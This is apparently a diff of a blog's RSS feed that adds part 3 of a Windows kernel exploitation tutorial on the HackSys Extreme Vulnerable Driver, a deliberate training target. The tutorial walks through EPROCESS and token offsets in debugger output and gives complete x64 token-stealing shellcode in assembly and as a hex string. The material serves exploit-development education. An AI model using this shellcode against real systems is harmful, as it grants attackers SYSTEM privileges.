+   +0x030 StackLimit       : Ptr64 Void
+   ...
+   +0x050 ApcState         : _KAPC_STATE
+   +0x050 ApcStateFill     : [43] UChar
+   +0x07b Priority         : Char
+   +0x07c NextProcessor    : Uint4B
+   +0x080 DeferredProcessor : Uint4B
+   +0x088 ApcQueueLock     : Uint8B
+   +0x090 WaitStatus       : Int8B
+   +0x098 WaitBlockList    : Ptr64 _KWAIT_BLOCK
+   +0x0a0 WaitListEntry    : _LIST_ENTRY
+   +0x0a0 SwapListEntry    : _SINGLE_LIST_ENTRY
+   +0x0b0 Queue            : Ptr64 _KQUEUE
+   +0x0b8 Teb              : Ptr64 Void
+   ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;KAPC_STATE&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Each thread keeps track of the process that it is associated with. It keeps track of this in the KAPC_STATE structure. This is good for us since we’re trying to get to the process so we can find it’s token. The KAPC_STATE structure is pretty simple:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; dt nt!_KAPC_STATE
+   +0x000 ApcListHead      : [2] _LIST_ENTRY
+   +0x020 Process          : Ptr64 _KPROCESS
+   +0x028 KernelApcInProgress : UChar
+   +0x029 KernelApcPending : UChar
+   +0x02a UserApcPending   : UChar
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We can ignore most of that but we are finally on our way to the KPROCESS structure! If you’re not excited about this then you’re doing it wrong. The KPROCESS structure, similar to KTHREAD, is the first part of a larger EPROCESS structure. Since we have our KPRCB.CurrentThread pointer already and we know that the KAPC_STATE.Process member we’re looking for is at KPRCB.CurrentThread + 50 + 20 we can once again do some hardcore number crunching and come up with the fact that to get to the current KAPC_STATE.Process you just add 70 to the KPRCB.CurrentThread pointer. Again, keep this in mind for later!&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;EPROCESS&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Here’s where all the good stuff is! In this case we’re interested in members that are outside of the KPROCESS structure but still inside the larger EPROCESS so our offsets can still be calculated correctly with the information we have so far. Let’s take a look at the EPROCESS next. I’ve cut out a bunch of items so we can just see the stuff that we care about for now.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; dt nt!_EPROCESS
+   +0x000 Pcb              : _KPROCESS
+   +0x160 ProcessLock      : _EX_PUSH_LOCK
+   +0x168 CreateTime       : _LARGE_INTEGER
+   +0x170 ExitTime         : _LARGE_INTEGER
+   +0x178 RundownProtect   : _EX_RUNDOWN_REF
+   +0x180 UniqueProcessId  : Ptr64 Void
+   +0x188 ActiveProcessLinks : _LIST_ENTRY
+   ...
+   +0x208 Token            : _EX_FAST_REF
+   ...
+   +0x2d8 Session          : Ptr64 Void
+   +0x2e0 ImageFileName    : [15] UChar
+   +0x2ef PriorityClass    : UChar
+   +0x2f0 JobLinks         : _LIST_ENTRY
+   +0x300 LockedPagesList  : Ptr64 Void
+   +0x308 ThreadListHead   : _LIST_ENTRY
+   +0x318 SecurityPort     : Ptr64 Void
+   +0x320 Wow64Process     : Ptr64 Void
+   +0x328 ActiveThreads    : Uint4B
+   +0x32c ImagePathHash    : Uint4B
+   +0x330 DefaultHardErrorProcessing : Uint4B
+   +0x334 LastThreadExitStatus : Int4B
+   +0x338 Peb              : Ptr64 _PEB
+    ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;EPROCESS.UniqueProcessId&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The EPROCESS.UniqueProcessId member is (as you may have guessed) a qword with the PID of the current process. This is important to note because we will need to find the EPROCESS structure with the UniqueProcessId of “4” so that we know we have the SYSTEM process and therefore can find it’s token. In case you, like me until recently, haven’t paid attention before, the “System” process that you see in the task manager always runs with a PID of 4. The token associated with this process is the crown jewel that we want to steal.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hevd3-ss1.jpg&quot; alt=&quot;Crown Jewel&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;EPROCESS.ActiveProcessLinks&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;EPROCESS.ActiveProcessLinks is a doubly-linked list containing the addresses of the corresponding ActiveProcessLinks list in the EPROCESS structure of each active process on the system (neat!). This means that each entry in the list points into another process’s EPROCESS structure at an offset of +188 above the EPROCESS base. The laws of mathematics tell us that this would also mean that each entry is at an offset of +8 above the UniqueProcessId of each active process. We’ll use this fact in our shellcode as we’ll see shortly.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;EPROCESS.Token&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally, EPROCESS.Token is the access token assigned to the process. You may have noticed that the token is shown as an EX_FAST_REF structure. Windows cheats a little bit by using the end of the token’s address for other purposes. All tokens are aligned such that they will always end with 0. As an example, below you can see that the pointer at offset +208 doesn’t exactly match the token listed by the &lt;code class=&quot;highlighter-rouge&quot;&gt;!process&lt;/code&gt; debugger extension but can be deduced programmatically with some boolean arithmetic:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; !process
+PROCESS fffffa8004034a40
+    SessionId: 1  Cid: 0d34    Peb: 7efdf000  ParentCid: 0570
+    DirBase: 0af6b000  ObjectTable: fffff8a0050b42c0  HandleCount: 130.
+    Image: pythonw.exe
+    VadRoot fffffa8003d67b70 Vads 97 Clone 0 Private 1822. Modified 0. Locked 0.
+    DeviceMap fffff8a00010b5c0
+    Token                             fffff8a00383aa00
+    ...
+0: kd&amp;gt; dq fffffa8004034a40+208 l1
+fffffa80`04034c48  fffff8a0`0383aa0f
+0: kd&amp;gt; ? poi(fffffa8004034a40+208) &amp;amp; fffffffffffffff0
+Evaluate expression: -8108839294464 = fffff8a0`0383aa00
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;With all that out of the way, let’s lay out the overview of what our shellcode needs to accomplish:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Get KTHREAD and EPROCESS pointers&lt;/li&gt;
+  &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)&lt;/li&gt;
+  &lt;li&gt;Save the SYSTEM token&lt;/li&gt;
+  &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)&lt;/li&gt;
+  &lt;li&gt;Copy the SYSTEM token over top of the cmd.exe token&lt;/li&gt;
+  &lt;li&gt;Recover without crashing&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;LET’S DO THIS!&lt;/p&gt;
+
+&lt;h4 id=&quot;step-one---get-kthreadethread-pointers&quot;&gt;Step one - get KTHREAD/ETHREAD pointers&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;&lt;strong&gt;Get KTHREAD and EPROCESS pointers &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)&lt;/li&gt;
+    &lt;li&gt;Save the SYSTEM token&lt;/li&gt;
+    &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)&lt;/li&gt;
+    &lt;li&gt;Copy the SYSTEM token over top of the cmd.exe token&lt;/li&gt;
+    &lt;li&gt;Recover without crashing&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;As mentioned previously, this is super simple. &lt;code class=&quot;highlighter-rouge&quot;&gt;gs:[0]&lt;/code&gt; is the KPCR plus +180 for the KPRCB plus +8 for the KTHREAD pointer; KTHREAD pointer plus +50 is the KAPC_STATE plus +20 for the EPROCESS pointer:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;start:
+    mov rdx, [gs:188h]  ;KTHREAD pointer
+    mov r8, [rdx+70h]   ;EPROCESS pointer
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;step-two---walk-the-activeprocesslinks&quot;&gt;Step two - walk the ActiveProcessLinks&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Get KTHREAD and EPROCESS pointers&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM) &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Save the SYSTEM token&lt;/li&gt;
+    &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)&lt;/li&gt;
+    &lt;li&gt;Copy the SYSTEM token over top of the cmd.exe token&lt;/li&gt;
+    &lt;li&gt;Recover without crashing&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;EPROCESS.ActiveProcessLinks is a doubly-linked list meaning that the structure starts with a pointer to the next entry, followed by a pointer to the previous entry, followed by the actual entry. The list starts at an offset of +188 above the EPROCESS structure base. Each entry points to the EPROCESS.ActiveProcessLinks list for each active process. We saw before that the EPROCESS.UniqueProcessId is at a relative offset of -8 away from the base of the EPROCESS.ActiveProcessLinks list. We will load the head of the list into the r9 register, load the first entry into rcx, and then set up a loop to walk through each entry in the list looking for UniqueProcessId 4:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    mov r9, [r8+188h]    ;ActiveProcessLinks list head
+    mov rcx, [r9]        ;follow link to first process in list
+find_system:
+    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
+    cmp rdx, 4           ;UniqueProcessId == 4? 
+    jz found_system      ;YES - move on
+    mov rcx, [rcx]       ;NO - load next entry in list
+    jmp find_system      ;loop
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once this loop has run it’s course, we should end up with the rcx register containing a pointer to an offset of +188 into the EPROCESS of the SYSTEM process.&lt;/p&gt;
+
+&lt;h4 id=&quot;step-three---save-the-system-token-address&quot;&gt;Step three - save the SYSTEM token address&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Get KTHREAD and EPROCESS pointers&lt;/li&gt;
+    &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Save the SYSTEM token &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)&lt;/li&gt;
+    &lt;li&gt;Copy the SYSTEM token over top of the cmd.exe token&lt;/li&gt;
+    &lt;li&gt;Recover without crashing&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Saving the SYSTEM token is easy enough to do. The rax register can be used to hold on to it. At this point, rcx is pointing to the SYSTEM EPROCESS+188 and the token we want is at EPROCESS+208. This means we’ll just have to move rcx+80 into rax and then just modify the low 4 bits to get our SYSTEM token pointer:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;found_system:
+    mov rax, [rcx+80h]    ;offset to token
+    and al, 0f0h          ;clear low 4 bits of _EX_FAST_REF structure
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;step-four---walk-the-activeprocesslinks-again&quot;&gt;Step four - walk the ActiveProcessLinks (again)&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Get KTHREAD and EPROCESS pointers&lt;/li&gt;
+    &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)&lt;/li&gt;
+    &lt;li&gt;Save the SYSTEM token&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe) &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Copy the SYSTEM token over top of the cmd.exe token&lt;/li&gt;
+    &lt;li&gt;Recover without crashing&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This is essentially the same as step two. The only difference is that we are searching for the PID of the cmd.exe process that we spawned rather than PID “4”. We will see the particulars of how to implement this in Python in the next blog entry, but for now we will just use a dummy PID of 1234. Here’s how it looks in assembly:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;find_cmd:
+    mov rdx, [rcx-8]    ;ActiveProcessLinks - 8 = UniqueProcessId
+    cmp rdx, 1234h      ;UniqueProcessId == XXXX? (PLACEHOLDER)
+    jz found_cmd        ;YES - move on
+    mov rcx, [rcx]      ;NO - next entry in list
+    jmp find_cmd        ;loop
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Once again after this loop does it’s job we have an address in rcx that is a pointer to cmd.exe’s EPROCESS+188. We’re almost done with our token heist!&lt;/p&gt;
+
+&lt;h4 id=&quot;step-four---copy-system-token-over-cmdexe-token&quot;&gt;Step four - copy SYSTEM token over cmd.exe token&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Get KTHREAD and EPROCESS pointers&lt;/li&gt;
+    &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)&lt;/li&gt;
+    &lt;li&gt;Save the SYSTEM token&lt;/li&gt;
+    &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Copy the SYSTEM token over top of the cmd.exe token &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Recover without crashing&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;It should go without saying that this is pretty straightforward. We have the SYSTEM token in rax and cmd.exe token in rcx+80.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;found_cmd:
+    mov [rcx+80h], rax    ;copy SYSTEM token over top of this process&#39;s token
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now at this point we officially have a shell running with SYSTEM privileges! Congratulations! Just one more thing… you won’t be able to enjoy your newly elevated shell if your machine BSODs.&lt;/p&gt;
+
+&lt;h4 id=&quot;step-five---recover-without-crashing&quot;&gt;Step five - recover without crashing&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Get KTHREAD and EPROCESS pointers&lt;/li&gt;
+    &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)&lt;/li&gt;
+    &lt;li&gt;Save the SYSTEM token&lt;/li&gt;
+    &lt;li&gt;Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)&lt;/li&gt;
+    &lt;li&gt;Copy the SYSTEM token over top of the cmd.exe token&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Recover without crashing &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This is a step that is too often ignored in user-land exploitation. “Who cares,” says the lazy exploit writer, “I’ve got my shell, let the application crash!” Unfortunately when we’re operating in ring 0 we don’t have such luxury. But, fortunately for us, we have a pretty easy out in this scenario. This can sometimes be tough to figure out where to go next and an attractive target is often to return back to the parent function as if nothing has gone awry. HEVD provides us with just such an easy out. At the point of the overflow the stack contains an address at rsp+28 which points back into the HEVD driver:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; ?poi(rsp+28)
+Evaluate expression: -8246261640726 = fffff880`048111ea
+0: kd&amp;gt; u fffff880048111ea l1
+HEVD+0x61ea:
+fffff880`048111ea 488d0d6f110000  lea     rcx,[HEVD+0x7360 (fffff880`04812360)]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;As you can see, it points into HEVD+0x61ea. What’s at this address? Remember this screenshot from our previous blog post?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hevd2-ss4.jpg&quot; alt=&quot;Serendipity&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;HEVD+0x61ea just happens to be the return address back to the IOCTL dispatch table right from where the HACKSYS_EVD_STACKOVERFLOW handler was called! This is a fantastic place to return back to! We got lucky this time so let’s be grateful and throw it into our shellcode. Here’s the simple recovery steps:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;return:
+    add rsp, 28h    ;HEVD+0x61ea
+    ret
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That wraps up everything we needed to accomplish in our shellcode! The next blog post will discuss implementing this in our Python exploit.&lt;/p&gt;
+
+&lt;p&gt;Here’s the shellcode in it’s final form:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;[BITS 64]
+
+; Windows 7 x64 token stealing shellcode
+; based on http://mcdermottcybersecurity.com/articles/x64-kernel-privilege-escalation
+
+start:
+    mov rdx, [gs:188h]   ;KTHREAD pointer
+    mov r8, [rdx+70h]    ;EPROCESS pointer
+    mov r9, [r8+188h]    ;ActiveProcessLinks list head
+    mov rcx, [r9]        ;follow link to first process in list
+find_system:
+    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
+    cmp rdx, 4           ;UniqueProcessId == 4? 
+    jz found_system      ;YES - move on
+    mov rcx, [rcx]       ;NO - load next entry in list
+    jmp find_system      ;loop
+found_system:
+    mov rax, [rcx+80h]   ;offset to token
+    and al, 0f0h         ;clear low 4 bits of _EX_FAST_REF structure
+find_cmd:
+    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
+    cmp rdx, 1234h       ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
+    jz found_cmd         ;YES - move on
+    mov rcx, [rcx]       ;NO - next entry in list
+    jmp find_cmd         ;loop
+found_cmd:
+    mov [rcx+80h], rax   ;copy SYSTEM token over top of this process&#39;s token
+return:
+    add rsp, 28h         ;HEVD+0x61ea
+    ret
+
+;String literal (replace \xZZ&#39;s with PID):
+;&quot;\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x4C\x8B\x42\x70\x4D\x8B\x88&quot;
+;&quot;\x88\x01\x00\x00\x49\x8B\x09\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74&quot;
+;&quot;\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x81\x80\x00\x00\x00\x24\xF0\x48&quot;
+;&quot;\x8B\x51\xF8\x48\x81\xFA\xZZ\xZZ\xZZ\xZZ\x74\x05\x48\x8B\x09\xEB&quot;
+;&quot;\xEE\x48\x89\x81\x80\x00\x00\x00\x48\x83\xC4\x28\xC3&quot;         
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I’d like to acknowledge &lt;a href=&quot;http://mcdermottcybersecurity.com/&quot;&gt;McDermott Cybersecurity&lt;/a&gt; for the very helpful &lt;a href=&quot;http://mcdermottcybersecurity.com/articles/x64-kernel-privilege-escalation&quot;&gt;article&lt;/a&gt; which provided a perfect starting-point for me in creating this shellcode.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 07 Jul 2016 00:00:00 -0400</pubDate>
+        <link>https://sizzop.github.io/2016/07/07/kernel-hacking-with-hevd-part-3.html</link>
+        <guid isPermaLink="true">https://sizzop.github.io/2016/07/07/kernel-hacking-with-hevd-part-3.html</guid>
+        
+        
+      </item>
     
       <item>
         <title>Kernel Hacking With HEVD Part 2 - The Bug</title>
@@ -93,6 +732,15 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
 &lt;/ul&gt;
 
 &lt;h4 id=&quot;step-one---get-a-handle&quot;&gt;Step one - get a handle&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;&lt;strong&gt;Get a handle to the vulnerable device &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
+    &lt;li&gt;Create a buffer with &amp;gt;2,048 bytes of data&lt;/li&gt;
+    &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
 &lt;p&gt;To get a handle to the device we need to use the &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx&quot;&gt;CreateFile&lt;/a&gt; API in Kernel32.dll. As MSDN says, this function “Creates or opens a file or I/O device. … The function returns a handle that can be used to access the file or device for various types of I/O depending on the file or device and the flags and attributes specified.” The function prototype is pretty straightforward and doesn’t require any special structures so we can go ahead and recreate it in Python pretty easily. Each of the parameters are documented in the MSDN article. I took the hex values for each constant (GENERIC_READ, etc.) and defined that at the top of my Python script and then created a function that calls the API and returns a handle to the device (mind the Unicode!):&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;gethandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
@@ -107,7 +755,7 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
     &lt;span class=&quot;n&quot;&gt;dwFlagsAndAttributes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILE_ATTRIBUTE_NORMAL&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;hTemplateFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
 
-    &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;windll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CreateFileW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFileW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                         &lt;span class=&quot;n&quot;&gt;dwDesiredAccess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                         &lt;span class=&quot;n&quot;&gt;dwShareMode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                         &lt;span class=&quot;n&quot;&gt;lpSecurityAttributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
@@ -115,16 +763,25 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
                                         &lt;span class=&quot;n&quot;&gt;dwFlagsAndAttributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                         &lt;span class=&quot;n&quot;&gt;hTemplateFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[-]Error getting device handle: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FormatError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-]Error getting device handle: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FormatError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
         
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]Got device handle: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+]Got device handle: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 &lt;p&gt;easy peasy.&lt;/p&gt;
 
 &lt;h4 id=&quot;step-two---get-the-ioctl&quot;&gt;Step two - get the IOCTL&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Get the correct IOCTL for the stack overflow function &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Create a buffer with &amp;gt;2,048 bytes of data&lt;/li&gt;
+    &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
 &lt;p&gt;IOCTLs are actually made up of four components - the device type, a function code, the I/O method, and the allowed access. This is all explained in &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/hardware/ff543023(v=vs.85).aspx&quot;&gt;this MSDN article&lt;/a&gt; as well as the Windows chapter in &lt;a href=&quot;https://www.amazon.com/Guide-Kernel-Exploitation-Attacking-Core/dp/1597494860&quot;&gt;&lt;em&gt;Guide to Kernel Exploitation&lt;/em&gt;&lt;/a&gt; among other places. The driver developer generally uses some pre-defined constants to specify these inputs except for the function code which is a hex value which can be more or less arbitrary as long as it’s above 0x7FF for 3rd party drivers. The WDK gives developers a macro to use to define these IOCTLs and you can see in HackSysExtremeVulnerableDriver.h that it is used here as well:&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
@@ -172,6 +829,15 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
 &lt;p&gt;There is a lot more that can be said about reversing IOCTLs and maybe that would be a good blog post for another time, but hopefully this at least gives you some ideas to start with when trying to find IOCTLs in closed-source drivers. The driver has to compare the supplied IOCTL with the IOCTLs that it knows how to handle at some point so look for that.&lt;/p&gt;
 
 &lt;h4 id=&quot;step-three---create-the-buffer&quot;&gt;Step three - create the buffer&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+    &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
